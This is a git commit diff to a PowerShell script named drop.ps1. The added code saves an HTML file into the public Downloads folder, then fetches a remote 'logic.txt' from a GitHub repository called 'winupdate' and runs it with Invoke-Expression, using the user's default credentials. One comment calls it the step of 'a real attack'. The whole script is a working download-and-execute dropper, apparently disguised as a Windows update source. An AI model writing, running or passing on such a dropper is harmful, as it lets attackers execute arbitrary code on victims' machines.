08b3e735484f9c5f922c7edb94b8bf840c6c1593
gwyn1869 <gplaine53@gmail.com>
2026-03-16 15:59:06 +0200

    Update drop.ps1

--- drop.ps1
+++ drop.ps1
@@ -1,3 +1,11 @@
-Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri <THE-URL> –OutFile test.html
+$blobPath = "C:\Users\Public\Downloads\test.html"
+$blobUrl = "https://github.com/gwyn1869/winupdate/blob/main/test.html"
+$logicUrl = "https://github.com/gwyn1869/winupdate/blob/main/logic.txt"
 
-(Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri <THE-URL>).content 
+# 1. Save the .html file using specified parameters
+Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $blobUrl -OutFile $blobPath
+
+# 2. Retrieve and run the logic script
+# In a real attack, this downloads the text from $logicUrl and pipes it to IEX
+$remoteLogic = (Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri $logicUrl).Content
+Invoke-Expression -Command $remoteLogic
